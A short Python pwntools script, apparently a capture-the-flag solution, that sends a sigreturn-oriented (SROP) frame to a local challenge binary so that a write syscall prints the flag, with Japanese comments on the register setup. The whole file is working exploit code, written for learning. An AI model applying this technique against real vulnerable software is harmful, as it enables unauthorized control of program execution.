#!/usr/bin/env python3 
from pwn import *

target = process("./funsignals_player_bin")
#elf = ELF("funsignals_playe_bin")
#gdb.attach(target)

context.arch = "amd64"
frame = SigreturnFrame()

""" 
write関数をsycallで呼び出し,標準出力に出力させる
write(int fd, void *buf, size_t count)
"""
#rax システムコール
frame.rax = 0x1
#writeの引数をそれぞれ代入 bufにはflagの位置を入れる
frame.rdi = 0x1
frame.rsi = 0x10000023
frame.rdx = 0x28
#ripはシステムコールの座標
frame.rip = 0x10000012

target.sendline(bytes(frame))
target.interactive()